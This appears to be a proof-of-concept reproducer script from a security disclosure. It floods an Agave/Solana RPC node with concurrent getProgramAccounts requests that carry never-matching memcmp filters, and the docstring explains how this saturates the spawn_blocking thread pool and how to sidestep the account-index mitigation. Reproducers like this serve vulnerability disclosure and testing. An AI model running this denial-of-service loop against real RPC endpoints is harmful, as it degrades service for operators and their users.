#!/usr/bin/env python3
"""SOL_P07 reproducer — getProgramAccounts spawn_blocking pool saturation.

Standalone reproducer for the SOL_P07 finding in the NullRabbit
2026-04-30 Agave RPC disclosure bundle. Self-contained Python 3
stdlib only.

Target: agave v3.1.9, commit 765ee54adc4f574b1cd4f03a5500bf46c0af0817
Tested against: solana-test-validator 2.2.16

Mechanism: getProgramAccounts runs a full account-set scan inside
spawn_blocking. The filter (memcmp / dataSize) is checked inline
during iteration, not by an index lookup. A never-matching filter
forces a full O(N) scan that occupies a spawn_blocking thread for
the entire scan duration regardless of result-set size.

Default-vs-indexed scoping: the full-scan path is the default
behaviour for un-indexed programs. Operators can configure
account_indexes = [ProgramId] to bypass the full-scan path for
specifically-indexed programs (e.g. SPL Token). The mitigation is
partial: indexes cover a fixed operator-chosen set, and an attacker
can target any program OUTSIDE the indexed set to force the
full-scan path.

The disclosure-grade signal is concurrency, not single-request
latency: a 1000× state increase yielded only a 1.9× single-thread
latency increase. Solana's AccountsDb in-memory scan is
well-optimised. The architectural finding is spawn_blocking pool
saturation under concurrency, not per-request scan amplification.

State pre-condition for headline magnitude — REQUIRED:
    The headline measurement (8× per-worker req/s drop, p50 130 ms
    at 8 workers) requires the SPL Token program to be populated
    with ~10K token accounts so the filter-miss scan does
    meaningful work. The reproducer runs against any state but the
    measurement scales with N. Run the populator helper at
    ./populator/spl_token_populator.sh BEFORE the reproducer to
    seed 10K accounts (~3 minutes wall-clock with parallel xargs).

    The reproducer itself does not auto-invoke the populator — you
    run it once before the measurement, then the reproducer runs
    against the populated state.

Reproducing the headline finding requires running the reproducer
twice — once at --workers 1 to establish the single-thread baseline,
then again at --workers 8 to demonstrate the spawn_blocking pool
saturation. Compare per-worker req/s between the two runs:

    --workers 1  (baseline)        : ~59.5 req/s, p50 16.3 ms
    --workers 8  (default, headline): ~60.0 req/s aggregate
                                       (~7.5 req/s per worker → 8× drop,
                                        p50 130.3 ms → 8× rise)

The aggregate-throughput ceiling (~60 req/s under 8× concurrency)
is the signature: the spawn_blocking pool is fully busy and total
throughput is pegged. A single --workers run shows the filter-miss
scan engages but does NOT reproduce the pool-saturation finding —
only the 1-vs-8 comparison surfaces the architectural pattern.

Headline measurements at 10,077 SPL token accounts populated:
    1-thread aggregate req/s : 59.5
    8-worker aggregate req/s : 60.0   (flat — pool saturated)
    8-worker per-worker req/s: 7.5    (8× drop vs single-thread)
    1-thread p50 latency     : 16.3 ms
    8-worker p50 latency     : 130.3 ms (8× rise)
    8-worker p99 latency     : 184.7 ms

Source citations (agave v3.1.9 / 765ee54):
    rpc/src/rpc.rs:2199-2252  async fn get_filtered_program_accounts
    rpc/src/rpc.rs:2207-2227  indexed branch (when configured)
    rpc/src/rpc.rs:2235-2251  default un-indexed branch:
                              spawn_blocking + full O(N) scan,
                              filter checked inline

Usage:

    # 1. Optional: populate SPL Token state (see populator/ helper).
    bash populator/spl_token_populator.sh 10000 32

    # 2. Run the reproducer (1-thread baseline)
    python3 SOL_P07_repro.py --workers 1 --duration 30

    # 3. Run with 8 attacker workers (matches headline measurement)
    python3 SOL_P07_repro.py --workers 8 --duration 10
"""

from __future__ import annotations

import argparse
import json
import statistics
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from http.client import HTTPConnection
from urllib.parse import urlparse

# Bytes that virtually no SPL token account will match at offset 0
# (mint pubkey field). Base58 of [0]*31 + [1] — encoded form
# closely related to the system program but distinct from any real
# token-account mint reference.
NEVER_MATCH_BYTES_BASE58 = "11111111111111111111111111111112"


def build_body(program: str, offset: int, never_match: str) -> bytes:
    return json.dumps({
        "jsonrpc": "2.0", "id": 1,
        "method": "getProgramAccounts",
        "params": [program, {
            "encoding": "base64",
            "filters": [{"memcmp": {"offset": offset, "bytes": never_match}}],
        }],
    }).encode()


def send_one(host: str, port: int, body: bytes, timeout: float):
    t0 = time.monotonic()
    status = None
    resp_bytes = 0
    try:
        conn = HTTPConnection(host, port, timeout=timeout)
        conn.request("POST", "/", body, {
            "Content-Type": "application/json",
            "Content-Length": str(len(body)),
        })
        resp = conn.getresponse()
        body_resp = resp.read()
        status = resp.status
        resp_bytes = len(body_resp)
        conn.close()
    except Exception as e:
        print(f"  request error: {e}", file=sys.stderr)
    return status, resp_bytes, int((time.monotonic() - t0) * 1e9)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--target", default="http://127.0.0.1:8899")
    ap.add_argument("--program", default="TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
                    help="program id to scan (default SPL Token v1)")
    ap.add_argument("--memcmp-offset", type=int, default=0)
    ap.add_argument("--memcmp-bytes", default=NEVER_MATCH_BYTES_BASE58)
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--duration", type=float, default=10.0)
    ap.add_argument("--timeout", type=float, default=60.0)
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 8899
    body = build_body(args.program, args.memcmp_offset, args.memcmp_bytes)

    print(f"SOL_P07 reproducer — agave v3.1.9 / 765ee54")
    print(f"target            : {host}:{port}")
    print(f"program           : {args.program}")
    print(f"filter            : memcmp at offset {args.memcmp_offset}, "
          f"never-matching bytes")
    print(f"workers           : {args.workers}")
    print(f"duration          : {args.duration}s")
    print(f"request body      : {len(body)} bytes")
    print()

    stop = threading.Event()
    results: list = []
    results_lock = threading.Lock()

    def worker_loop() -> int:
        n = 0
        while not stop.is_set():
            r = send_one(host, port, body, args.timeout)
            with results_lock:
                results.append(r)
            n += 1
        return n

    t_start = time.monotonic()
    deadline = t_start + args.duration
    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = [pool.submit(worker_loop) for _ in range(args.workers)]
        while time.monotonic() < deadline:
            time.sleep(0.1)
        stop.set()
        [f.result() for f in futures]
    elapsed = time.monotonic() - t_start

    n = len(results)
    if n == 0:
        print("No completed requests.", file=sys.stderr)
        return 1

    ok_count = sum(1 for s, _, _ in results if s == 200)
    sizes = [b for _, b, _ in results if b > 0]
    durs_ms = [d / 1e6 for _, _, d in results]
    durs_ms.sort()
    p50 = durs_ms[n // 2]
    p99 = durs_ms[min(n - 1, int(0.99 * n))]

    print(f"=== results ===")
    print(f"  total requests        : {n}")
    print(f"  http 200              : {ok_count} ({ok_count/n*100:.1f}%)")
    print(f"  aggregate req/s       : {n/elapsed:.1f}")
    print(f"  per-worker req/s      : {n/elapsed/args.workers:.1f}")
    print(f"  per-request resp size : {statistics.mean(sizes):.0f} bytes "
          f"(empty array = filter miss)")
    print(f"  p50 latency           : {p50:.1f} ms")
    print(f"  p99 latency           : {p99:.1f} ms")
    print()
    print(f"Headline reference at 10,077 SPL token accounts populated, "
          f"solana-test-validator 2.2.16:")
    print(f"  1-thread aggregate    : 59.5 req/s, p50 16.3 ms, p99 26.1 ms")
    print(f"  8-worker aggregate    : 60.0 req/s (flat — pool saturated)")
    print(f"  8-worker per-worker   : 7.5 req/s (8× drop)")
    print(f"  8-worker p50/p99      : 130.3 ms / 184.7 ms")
    print()
    print(f"Sub-linear scan-cost calibration:")
    print(f"  sparse state (~5-10 program-data accounts) → p50 8.6 ms")
    print(f"  populated state (10K SPL token accounts)   → p50 16.3 ms")
    print(f"  1000× state increase → 1.9× latency increase. Solana's")
    print(f"  AccountsDb in-memory scan is well-optimised; the disclosure")
    print(f"  is pool saturation under concurrency, not per-request")
    print(f"  scan amplification.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
